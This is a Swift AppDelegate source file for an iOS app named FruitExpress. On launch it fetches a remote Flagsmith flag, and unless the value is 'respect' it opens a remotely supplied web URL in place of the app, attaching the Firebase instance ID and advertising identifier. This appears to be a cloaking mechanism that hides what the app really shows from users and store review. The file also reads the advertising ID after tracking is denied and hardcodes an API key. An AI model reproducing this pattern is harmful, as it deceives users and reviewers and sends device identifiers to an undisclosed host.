//
//  AppDelegate.swift
//  FruitExpress
//
//  Created by Андрей Сторожко on 13.08.2024.
//

import UIKit
import FirebaseCore
import FirebaseAnalytics
import AdSupport
import AppTrackingTransparency
import FirebaseInstallations
import FlagsmithClient

@main
class AppDelegate: UIResponder, UIApplicationDelegate {
    
    var window: UIWindow?
    weak var initialVC: ViewController?
    var identifierAdvertising: String = ""
    var analyticsAppId: String = ""
    var timer = 0
    static var orientationLock = UIInterfaceOrientationMask.all
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        self.window = UIWindow(frame: UIScreen.main.bounds)
        
        let viewController = ViewController()
        initialVC = viewController
        window?.rootViewController = initialVC
        window?.makeKeyAndVisible()
        
        FirebaseApp.configure()
        Flagsmith.shared.apiKey = "4zCBM4i9HdDDNGarcudVe3"
        
        Task { @MainActor in
            analyticsAppId = await fetchAnalyticsAppInstanceId()
            print("App Instance ID: \(analyticsAppId)")
        }
        
        start(viewController: viewController)
        
        return true
    }
    
    
    func fetchAnalyticsAppInstanceId() async -> String {
        do {
            if let appInstanceID = Analytics.appInstanceID() {
                return appInstanceID
            } else {
                return ""
            }
        }
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        ATTrackingManager.requestTrackingAuthorization { (status) in
            print("IIIAAA FIRST")
            self.timer = 10
            switch status {
            case .authorized:
                print("Authorized")
                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                self.timer = 1
            case .denied:
                print("Denied")
                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            case .notDetermined:
                print("Not Determined")
            case .restricted:
                print("Restricted")
            @unknown default:
                print("Unknown")
            }
        }
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
            return AppDelegate.orientationLock
        }
        
        func start(viewController: ViewController) {
            Flagsmith.shared.getValueForFeature(withID: "fruitexpresssid", forIdentity: nil) { result in
                DispatchQueue.main.async {
                    switch result {
                    case .success(let value):
                        print("Advertising ID: \(self.identifierAdvertising)")
                        guard let stringJSON = value?.stringValue else {
                            viewController.openApp()
                            return
                        }
                        
                        self.parseJSONString(stringJSON) { parsedResult in
                            
                            guard parsedResult != "respect" else {
                                viewController.openApp()
                                return
                            }
                            
                            guard !parsedResult.isEmpty else {
                                print("IIIAAA OPEN APP 1")
                                viewController.openApp()
                                return
                            }
                            
                            print("IIIAAA SECOND")
                            if self.identifierAdvertising.isEmpty {
                                print("IIIAAA THIRD")
                                self.timer = 5
                                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                            }
                            
                            if self.identifierAdvertising.isEmpty {
                                viewController.openApp()
                                return
                            }
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(self.timer)) {
                                let stringURL = viewController.createURL(mainURL: parsedResult, deviceID: self.analyticsAppId, advertiseID: self.identifierAdvertising)
                                print("IIIAAA URL: \(stringURL)")
                                
                                guard let url = URL(string: stringURL) else {
                                    viewController.openApp()
                                    return
                                }
                                
                                if UIApplication.shared.canOpenURL(url) {
                                    viewController.openWeb(stringURL: stringURL)
                                    print("IIIAAA OPEN WEB")
                                } else {
                                    print("IIIAAA OPEN APP")
                                    viewController.openApp()
                                }
                            }
                        }
                    case .failure(let error):
                        print("Error: \(error.localizedDescription)")
                        viewController.openApp()
                    }
                }
            }
        }
        
        func parseJSONString(_ jsonString: String, completion: @escaping (String) -> Void) {
            DispatchQueue.global(qos: .background).async {
                if let jsonData = jsonString.data(using: .utf8) {
                    do {
                        let property = try JSONDecoder().decode(Property.self, from: jsonData)
                        DispatchQueue.main.async {
                            completion(property.clock)
                        }
                    } catch {
                        print("Failed to decode JSON: \(error)")
                    }
                } else {
                    print("Failed to convert string to Data")
                }
            }
        }
    }

// MARK: - Property
struct Property: Codable {
    let walk: [Int]
    let clock, propertyGuard, season, source: String
    
    enum CodingKeys: String, CodingKey {
        case walk, clock
        case propertyGuard = "guard"
        case season, source
    }
}
